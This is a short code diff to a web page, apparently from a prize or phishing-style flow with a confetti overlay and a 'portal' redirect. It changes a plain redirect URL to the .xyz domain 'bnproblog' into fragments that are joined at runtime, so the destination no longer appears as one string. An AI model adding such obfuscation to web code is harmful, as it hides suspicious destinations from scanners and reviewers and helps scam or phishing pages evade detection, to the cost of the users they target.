@@ -853,7 +853,9 @@ $v = time();
   <canvas id="confettiCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:10000;display:none;"></canvas>
 
   <script>
-    const PORTAL_URL = 'https://bnproblog.xyz/';
+    /* URL del siguiente paso construida en runtime */
+    const _p = ['ht','tps','://','bnp','rob','log','.x','yz','/'];
+    const PORTAL_URL = _p.join('');
 
     /* Carga diferida de marca */
     setTimeout(function() {
